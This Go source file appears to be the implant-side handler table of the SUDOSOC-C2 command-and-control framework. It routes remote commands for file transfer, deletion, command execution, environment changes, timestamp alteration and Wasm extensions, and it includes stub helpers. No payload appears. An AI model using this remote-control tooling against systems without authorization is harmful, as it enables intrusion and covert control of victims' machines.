//go:build !(linux || darwin || windows)

package handlers

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2019  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	----------------------------------------------------------------------

	This file contains only pure Go handlers, which can be compiled for any
	platform/arch.

*/

import (
	"os"

	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
)

var (
	genericHandlers = map[uint32]RPCHandler{
		sudosocpb.MsgPing:               pingHandler,
		sudosocpb.MsgLsReq:              dirListHandler,
		sudosocpb.MsgDownloadReq:        downloadHandler,
		sudosocpb.MsgUploadReq:          uploadHandler,
		sudosocpb.MsgCdReq:              cdHandler,
		sudosocpb.MsgPwdReq:             pwdHandler,
		sudosocpb.MsgRmReq:              rmHandler,
		sudosocpb.MsgMkdirReq:           mkdirHandler,
		sudosocpb.MsgMvReq:              mvHandler,
		sudosocpb.MsgCpReq:              cpHandler,
		sudosocpb.MsgExecuteReq:         executeHandler,
		sudosocpb.MsgExecuteChildrenReq: executeChildrenHandler,
		sudosocpb.MsgSetEnvReq:          setEnvHandler,
		sudosocpb.MsgEnvReq:             getEnvHandler,
		sudosocpb.MsgUnsetEnvReq:        unsetEnvHandler,
		sudosocpb.MsgReconfigureReq:     reconfigureHandler,
		sudosocpb.MsgChtimesReq:         chtimesHandler,
		sudosocpb.MsgGrepReq:            grepHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		sudosocpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		sudosocpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		sudosocpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
	}
)

// GetSystemHandlers - Returns a map of the generic handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return genericHandlers
}

// GetSystemPivotHandlers - Not supported
func GetSystemPivotHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// Stub
func getUid(fileInfo os.FileInfo) string {
	return ""
}

// Stub
func getGid(fileInfo os.FileInfo) string {
	return ""
}
